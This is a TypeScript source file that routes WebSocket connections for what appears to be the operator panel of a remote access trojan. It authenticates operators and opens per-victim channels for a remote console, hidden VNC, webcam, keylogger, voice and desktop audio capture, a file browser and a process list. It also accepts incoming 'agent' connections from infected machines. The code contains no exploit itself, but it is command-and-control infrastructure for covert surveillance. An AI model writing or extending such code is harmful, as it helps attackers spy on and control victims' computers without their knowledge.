import { authenticateRequest } from "../../auth";
import { logger } from "../../logger";
import { isIpBanned } from "../../db";
import { canUserAccessClient, canUserAccessFeature } from "../../users";
import type { FeatureName } from "../../users";

type RequestServer = {
  requestIP: (req: Request) => { address?: string } | null | undefined;
  upgrade: (req: Request, data: any) => boolean;
};

type WsUpgradeDeps = {
  isAuthorizedAgentRequest: (req: Request, url: URL) => boolean;
};

const WS_RATE_WINDOW_MS = 10_000;
const WS_RATE_MAX = 30;
const wsRateMap = new Map<string, { count: number; windowStart: number }>();

setInterval(() => {
  const now = Date.now();
  for (const [ip, entry] of wsRateMap.entries()) {
    if (now - entry.windowStart > WS_RATE_WINDOW_MS * 2) {
      wsRateMap.delete(ip);
    }
  }
}, 30_000);

function isWsRateLimited(ip: string): boolean {
  if (!ip) return false;
  const now = Date.now();
  const entry = wsRateMap.get(ip);
  if (!entry || now - entry.windowStart > WS_RATE_WINDOW_MS) {
    wsRateMap.set(ip, { count: 1, windowStart: now });
    return false;
  }
  entry.count++;
  if (entry.count > WS_RATE_MAX) {
    logger.warn(`[rate-limit] WebSocket upgrade rate limit exceeded for IP ${ip}`);
    return true;
  }
  return false;
}

function checkOperatorAccess(
  user: { userId: number; role: string },
  clientId: string,
  feature: FeatureName,
): Response | null {
  if (!canUserAccessClient(user.userId, user.role as any, clientId)) {
    return new Response("Forbidden: client access denied", { status: 403 });
  }
  if (!canUserAccessFeature(user.userId, user.role as any, feature)) {
    return new Response("Forbidden: feature access denied", { status: 403 });
  }
  return null;
}

export async function handleWsUpgradeRoutes(
  req: Request,
  url: URL,
  server: RequestServer,
  deps: WsUpgradeDeps,
): Promise<Response | null> {
  const ip = server.requestIP(req)?.address || "";
  if (isWsRateLimited(ip)) {
    return new Response("Too Many Requests", { status: 429 });
  }

  const consoleWsMatch = url.pathname.match(/^\/api\/clients\/(.+)\/console\/ws$/);
  if (consoleWsMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const clientId = consoleWsMatch[1];
    const denied = checkOperatorAccess(user, clientId, "console");
    if (denied) return denied;
    const sessionId = crypto.randomUUID();
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "console_viewer", clientId, sessionId, ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  const wsMatch = url.pathname.match(/^\/api\/clients\/(.+)\/stream\/ws$/);
  if (wsMatch) {
    logger.info(`[auth] Checking agent authorization for client connection`);
    if (!deps.isAuthorizedAgentRequest(req, url)) {
      return new Response("Unauthorized", { status: 401 });
    }
    const clientId = wsMatch[1];
    const role = "client";
    const ip = server.requestIP(req)?.address || "";
    if (ip && isIpBanned(ip)) {
      logger.warn(`[auth] Rejected banned IP ${ip} for client ${clientId}`);
      return new Response("Forbidden", { status: 403 });
    }
    if (server.upgrade(req, { data: { role, clientId, ip } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  const rdMatch = url.pathname.match(/^\/api\/clients\/(.+)\/rd\/ws$/);
  if (rdMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const clientId = rdMatch[1];
    const denied = checkOperatorAccess(user, clientId, "remote_desktop");
    if (denied) return denied;
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "rd_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  const hvncMatch = url.pathname.match(/^\/api\/clients\/(.+)\/hvnc\/ws$/);
  if (hvncMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const clientId = hvncMatch[1];
    const denied = checkOperatorAccess(user, clientId, "hvnc");
    if (denied) return denied;
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "hvnc_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  const webcamMatch = url.pathname.match(/^\/api\/clients\/(.+)\/webcam\/ws$/);
  if (webcamMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const clientId = webcamMatch[1];
    const denied = checkOperatorAccess(user, clientId, "webcam");
    if (denied) return denied;
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "webcam_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  const fbMatch = url.pathname.match(/^\/api\/clients\/(.+)\/files\/ws$/);
  if (fbMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const clientId = fbMatch[1];
    const denied = checkOperatorAccess(user, clientId, "file_browser");
    if (denied) return denied;
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "file_browser_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  const processMatch = url.pathname.match(/^\/api\/clients\/(.+)\/processes\/ws$/);
  if (processMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const clientId = processMatch[1];
    const denied = checkOperatorAccess(user, clientId, "processes");
    if (denied) return denied;
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "process_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  const keyloggerMatch = url.pathname.match(/^\/api\/clients\/(.+)\/keylogger\/ws$/);
  if (keyloggerMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const clientId = keyloggerMatch[1];
    const denied = checkOperatorAccess(user, clientId, "keylogger");
    if (denied) return denied;
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "keylogger_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  const voiceMatch = url.pathname.match(/^\/api\/clients\/(.+)\/voice\/ws$/);
  if (voiceMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const clientId = voiceMatch[1];
    const denied = checkOperatorAccess(user, clientId, "voice");
    if (denied) return denied;
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "voice_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  const desktopAudioMatch = url.pathname.match(/^\/api\/clients\/(.+)\/desktop-audio\/ws$/);
  if (desktopAudioMatch) {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }
    const clientId = desktopAudioMatch[1];
    const denied = checkOperatorAccess(user, clientId, "voice");
    if (denied) return denied;
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "desktop_audio_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  if (req.method === "GET" && url.pathname === "/api/notifications/ws") {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "notifications_viewer", clientId: "", ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  if (req.method === "GET" && url.pathname === "/api/dashboard/ws") {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "dashboard_viewer", clientId: "", ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  if (req.method === "GET" && url.pathname === "/api/chat/ws") {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }
    const ip = server.requestIP(req)?.address || "";
    if (server.upgrade(req, { data: { role: "chat_viewer", clientId: "", ip, userRole: user.role, userId: user.userId } })) {
      return new Response();
    }
    return new Response("Upgrade failed", { status: 500 });
  }

  return null;
}
